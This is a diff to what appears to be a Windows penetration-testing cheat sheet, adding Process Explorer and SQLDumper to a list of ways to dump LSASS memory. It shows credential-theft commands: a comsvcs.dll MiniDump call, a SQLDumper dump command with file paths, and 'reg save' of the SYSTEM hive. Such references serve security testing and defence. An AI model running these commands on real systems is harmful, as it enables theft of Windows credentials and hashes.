@@ -471,10 +471,12 @@ and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms
 <h3 id="dump-lsass-process">Dump LSASS process</h3>
 <p>There is various methods to dump the <code>lsass</code> process memory:</p>
 <ul>
-<li>Mimikatz</li>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></li>
 <li>TaskManager</li>
 <li>Rundll32 &amp; comsvcs.dll</li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank">Process Explorer</a></li>
+<li><a href="https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/" target="_blank">SQLDumper</a></li>
+<li>Mimikatz</li>
 <li><a href="https://github.com/Hackndo/lsassy" target="_blank">lsassy</a></li>
 <li><a href="https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/" target="_blank">Silent Process Exit mechanism</a></li>
 </ul>
@@ -485,6 +487,14 @@ and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms
 <p>You need to get the PID of <code>lsass</code> before dumping it.</p>
 <pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
+</code></pre>
+<h4 id="sqldumper">SQLDumper</h4>
+<p>You need to get the PID of <code>lsass</code> before dumping it. The tool can be found in
+one of the following path:</p>
+<pre><code class="language-none">C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
+C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
+</code></pre>
+<pre><code class="language-bash">sqldumper.exe &lt;PID&gt; 0 0x01100:40
 </code></pre>
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
 <pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
